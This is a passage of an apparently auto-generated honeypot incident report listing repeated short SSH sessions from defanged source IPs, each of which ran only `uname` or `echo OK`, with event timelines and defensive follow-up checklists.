- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8eb13f8280f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:19` | `cowrie.session.connect` |
| `2026-07-04 19:02:20` | `cowrie.client.version` |
| `2026-07-04 19:02:20` | `cowrie.client.kex` |
| `2026-07-04 19:02:20` | `cowrie.login.success` |
| `2026-07-04 19:02:21` | `cowrie.session.params` |
| `2026-07-04 19:02:21` | `cowrie.command.input` |
| `2026-07-04 19:02:22` | `cowrie.log.closed` |
| `2026-07-04 19:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3a5bb006900

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:25` | `cowrie.session.connect` |
| `2026-07-04 19:02:25` | `cowrie.client.version` |
| `2026-07-04 19:02:25` | `cowrie.client.kex` |
| `2026-07-04 19:02:26` | `cowrie.login.success` |
| `2026-07-04 19:02:27` | `cowrie.session.params` |
| `2026-07-04 19:02:27` | `cowrie.command.input` |
| `2026-07-04 19:02:27` | `cowrie.log.closed` |
| `2026-07-04 19:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e40019dfc168

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:27` | `cowrie.session.connect` |
| `2026-07-04 19:02:28` | `cowrie.client.version` |
| `2026-07-04 19:02:28` | `cowrie.client.kex` |
| `2026-07-04 19:02:33` | `cowrie.login.success` |
| `2026-07-04 19:02:37` | `cowrie.session.params` |
| `2026-07-04 19:02:37` | `cowrie.command.input` |
| `2026-07-04 19:02:39` | `cowrie.log.closed` |
| `2026-07-04 19:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d231a5491219

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:30` | `cowrie.session.connect` |
| `2026-07-04 19:02:30` | `cowrie.client.version` |
| `2026-07-04 19:02:30` | `cowrie.client.kex` |
| `2026-07-04 19:02:31` | `cowrie.login.success` |
| `2026-07-04 19:02:31` | `cowrie.session.params` |
| `2026-07-04 19:02:31` | `cowrie.command.input` |
| `2026-07-04 19:02:32` | `cowrie.log.closed` |
| `2026-07-04 19:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06647b4f1741

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:36` | `cowrie.session.connect` |
| `2026-07-04 19:02:36` | `cowrie.client.version` |
| `2026-07-04 19:02:36` | `cowrie.client.kex` |
| `2026-07-04 19:02:36` | `cowrie.login.success` |
| `2026-07-04 19:02:38` | `cowrie.session.params` |
| `2026-07-04 19:02:38` | `cowrie.command.input` |
| `2026-07-04 19:02:38` | `cowrie.log.closed` |
| `2026-07-04 19:02:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea423cb711a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:41` | `cowrie.session.connect` |
| `2026-07-04 19:02:42` | `cowrie.client.version` |
| `2026-07-04 19:02:42` | `cowrie.client.kex` |
| `2026-07-04 19:02:42` | `cowrie.login.success` |
| `2026-07-04 19:02:43` | `cowrie.session.params` |
| `2026-07-04 19:02:43` | `cowrie.command.input` |
| `2026-07-04 19:02:44` | `cowrie.log.closed` |
| `2026-07-04 19:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18b7a985e64a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:47` | `cowrie.session.connect` |
| `2026-07-04 19:02:47` | `cowrie.client.version` |
| `2026-07-04 19:02:47` | `cowrie.client.kex` |
| `2026-07-04 19:02:47` | `cowrie.login.success` |
| `2026-07-04 19:02:48` | `cowrie.session.params` |
| `2026-07-04 19:02:48` | `cowrie.command.input` |
| `2026-07-04 19:02:48` | `cowrie.log.closed` |
| `2026-07-04 19:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad1ed0d12556

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:52` | `cowrie.session.connect` |
| `2026-07-04 19:02:52` | `cowrie.client.version` |
| `2026-07-04 19:02:52` | `cowrie.client.kex` |
| `2026-07-04 19:02:53` | `cowrie.login.success` |
| `2026-07-04 19:02:54` | `cowrie.session.params` |
| `2026-07-04 19:02:54` | `cowrie.command.input` |
| `2026-07-04 19:02:54` | `cowrie.log.closed` |
| `2026-07-04 19:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6f418ea1f5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:02 |
| **Last Seen** | 2026-07-04 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:02:58` | `cowrie.session.connect` |
| `2026-07-04 19:02:58` | `cowrie.client.version` |
| `2026-07-04 19:02:58` | `cowrie.client.kex` |
| `2026-07-04 19:02:58` | `cowrie.login.success` |
| `2026-07-04 19:02:59` | `cowrie.session.params` |
| `2026-07-04 19:02:59` | `cowrie.command.input` |
| `2026-07-04 19:02:59` | `cowrie.log.closed` |
| `2026-07-04 19:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97bb52b3ef97

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:03 |
| **Last Seen** | 2026-07-04 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:03:03` | `cowrie.session.connect` |
| `2026-07-04 19:03:03` | `cowrie.client.version` |
| `2026-07-04 19:03:03` | `cowrie.client.kex` |
| `2026-07-04 19:03:03` | `cowrie.login.success` |
| `2026-07-04 19:03:04` | `cowrie.session.params` |
| `2026-07-04 19:03:04` | `cowrie.command.input` |
| `2026-07-04 19:03:04` | `cowrie.log.closed` |
| `2026-07-04 19:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7e13d6b1049

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:03 |
| **Last Seen** | 2026-07-04 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:03:08` | `cowrie.session.connect` |
| `2026-07-04 19:03:08` | `cowrie.client.version` |
| `2026-07-04 19:03:08` | `cowrie.client.kex` |
| `2026-07-04 19:03:09` | `cowrie.login.success` |
| `2026-07-04 19:03:10` | `cowrie.session.params` |
| `2026-07-04 19:03:10` | `cowrie.command.input` |
| `2026-07-04 19:03:10` | `cowrie.log.closed` |
| `2026-07-04 19:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f59292d801de

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:03 |
| **Last Seen** | 2026-07-04 19:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:03:13` | `cowrie.session.connect` |
| `2026-07-04 19:03:14` | `cowrie.client.version` |
| `2026-07-04 19:03:14` | `cowrie.client.kex` |
| `2026-07-04 19:03:15` | `cowrie.login.success` |
| `2026-07-04 19:03:16` | `cowrie.session.params` |
| `2026-07-04 19:03:16` | `cowrie.command.input` |
| `2026-07-04 19:03:16` | `cowrie.log.closed` |
| `2026-07-04 19:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28f226dd625b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:03 |
| **Last Seen** | 2026-07-04 19:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:03:19` | `cowrie.session.connect` |
| `2026-07-04 19:03:19` | `cowrie.client.version` |
| `2026-07-04 19:03:19` | `cowrie.client.kex` |
| `2026-07-04 19:03:19` | `cowrie.login.success` |
| `2026-07-04 19:03:20` | `cowrie.session.params` |
| `2026-07-04 19:03:20` | `cowrie.command.input` |
| `2026-07-04 19:03:21` | `cowrie.log.closed` |
| `2026-07-04 19:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc369b5ec32

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:03 |
| **Last Seen** | 2026-07-04 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:03:24` | `cowrie.session.connect` |
| `2026-07-04 19:03:24` | `cowrie.client.version` |
| `2026-07-04 19:03:24` | `cowrie.client.kex` |
| `2026-07-04 19:03:24` | `cowrie.login.success` |
| `2026-07-04 19:03:25` | `cowrie.session.params` |
| `2026-07-04 19:03:25` | `cowrie.command.input` |
| `2026-07-04 19:03:25` | `cowrie.log.closed` |
| `2026-07-04 19:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37763bee298f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:03 |
| **Last Seen** | 2026-07-04 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:03:29` | `cowrie.session.connect` |
| `2026-07-04 19:03:29` | `cowrie.client.version` |
| `2026-07-04 19:03:29` | `cowrie.client.kex` |
| `2026-07-04 19:03:30` | `cowrie.login.success` |
| `2026-07-04 19:03:31` | `cowrie.session.params` |
| `2026-07-04 19:03:31` | `cowrie.command.input` |
| `2026-07-04 19:03:31` | `cowrie.log.closed` |
| `2026-07-04 19:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a106d6f02ff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:03 |
| **Last Seen** | 2026-07-04 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:03:35` | `cowrie.session.connect` |
| `2026-07-04 19:03:35` | `cowrie.client.version` |
| `2026-07-04 19:03:35` | `cowrie.client.kex` |
| `2026-07-04 19:03:35` | `cowrie.login.success` |
| `2026-07-04 19:03:36` | `cowrie.session.params` |
| `2026-07-04 19:03:36` | `cowrie.command.input` |
| `2026-07-04 19:03:36` | `cowrie.log.closed` |
| `2026-07-04 19:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-116fae319b61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:03 |
| **Last Seen** | 2026-07-04 19:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:03:39` | `cowrie.session.connect` |
| `2026-07-04 19:03:40` | `cowrie.client.version` |
| `2026-07-04 19:03:40` | `cowrie.client.kex` |
| `2026-07-04 19:03:41` | `cowrie.login.success` |
| `2026-07-04 19:03:42` | `cowrie.session.params` |
| `2026-07-04 19:03:42` | `cowrie.command.input` |
| `2026-07-04 19:03:42` | `cowrie.log.closed` |
| `2026-07-04 19:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bff68f8390e7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:03 |
| **Last Seen** | 2026-07-04 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:03:45` | `cowrie.session.connect` |
| `2026-07-04 19:03:45` | `cowrie.client.version` |
| `2026-07-04 19:03:45` | `cowrie.client.kex` |
| `2026-07-04 19:03:46` | `cowrie.login.success` |
| `2026-07-04 19:03:46` | `cowrie.session.params` |
| `2026-07-04 19:03:46` | `cowrie.command.input` |
| `2026-07-04 19:03:47` | `cowrie.log.closed` |
| `2026-07-04 19:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d089ac434e6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:03 |
| **Last Seen** | 2026-07-04 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:03:51` | `cowrie.session.connect` |
| `2026-07-04 19:03:51` | `cowrie.client.version` |
| `2026-07-04 19:03:51` | `cowrie.client.kex` |
| `2026-07-04 19:03:51` | `cowrie.login.success` |
| `2026-07-04 19:03:52` | `cowrie.session.params` |
| `2026-07-04 19:03:52` | `cowrie.command.input` |
| `2026-07-04 19:03:52` | `cowrie.log.closed` |
| `2026-07-04 19:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a3ff9fdd8e8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:03 |
| **Last Seen** | 2026-07-04 19:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:03:55` | `cowrie.session.connect` |
| `2026-07-04 19:03:56` | `cowrie.client.version` |
| `2026-07-04 19:03:56` | `cowrie.client.kex` |
| `2026-07-04 19:03:56` | `cowrie.login.success` |
| `2026-07-04 19:03:58` | `cowrie.session.params` |
| `2026-07-04 19:03:58` | `cowrie.command.input` |
| `2026-07-04 19:03:58` | `cowrie.log.closed` |
| `2026-07-04 19:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a7ee80a61d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:04 |
| **Last Seen** | 2026-07-04 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:04:01` | `cowrie.session.connect` |
| `2026-07-04 19:04:01` | `cowrie.client.version` |
| `2026-07-04 19:04:01` | `cowrie.client.kex` |
| `2026-07-04 19:04:02` | `cowrie.login.success` |
| `2026-07-04 19:04:02` | `cowrie.session.params` |
| `2026-07-04 19:04:02` | `cowrie.command.input` |
| `2026-07-04 19:04:03` | `cowrie.log.closed` |
| `2026-07-04 19:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1378762e516

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:04 |
| **Last Seen** | 2026-07-04 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:04:07` | `cowrie.session.connect` |
| `2026-07-04 19:04:07` | `cowrie.client.version` |
| `2026-07-04 19:04:07` | `cowrie.client.kex` |
| `2026-07-04 19:04:07` | `cowrie.login.success` |
| `2026-07-04 19:04:08` | `cowrie.session.params` |
| `2026-07-04 19:04:08` | `cowrie.command.input` |
| `2026-07-04 19:04:08` | `cowrie.log.closed` |
| `2026-07-04 19:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-494fe56561a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:04 |
| **Last Seen** | 2026-07-04 19:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:04:12` | `cowrie.session.connect` |
| `2026-07-04 19:04:12` | `cowrie.client.version` |
| `2026-07-04 19:04:12` | `cowrie.client.kex` |
| `2026-07-04 19:04:13` | `cowrie.login.success` |
| `2026-07-04 19:04:14` | `cowrie.session.params` |
| `2026-07-04 19:04:14` | `cowrie.command.input` |
| `2026-07-04 19:04:14` | `cowrie.log.closed` |
| `2026-07-04 19:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef5f8a21a99f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:04 |
| **Last Seen** | 2026-07-04 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:04:18` | `cowrie.session.connect` |
| `2026-07-04 19:04:18` | `cowrie.client.version` |
| `2026-07-04 19:04:18` | `cowrie.client.kex` |
| `2026-07-04 19:04:18` | `cowrie.login.success` |
| `2026-07-04 19:04:19` | `cowrie.session.params` |
| `2026-07-04 19:04:19` | `cowrie.command.input` |
| `2026-07-04 19:04:19` | `cowrie.log.closed` |
| `2026-07-04 19:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86db9941b1e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:04 |
| **Last Seen** | 2026-07-04 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:04:23` | `cowrie.session.connect` |
| `2026-07-04 19:04:23` | `cowrie.client.version` |
| `2026-07-04 19:04:24` | `cowrie.client.kex` |
| `2026-07-04 19:04:24` | `cowrie.login.success` |
| `2026-07-04 19:04:25` | `cowrie.session.params` |
| `2026-07-04 19:04:25` | `cowrie.command.input` |
| `2026-07-04 19:04:25` | `cowrie.log.closed` |
| `2026-07-04 19:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d669fca0b596

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:04 |
| **Last Seen** | 2026-07-04 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:04:29` | `cowrie.session.connect` |
| `2026-07-04 19:04:29` | `cowrie.client.version` |
| `2026-07-04 19:04:29` | `cowrie.client.kex` |
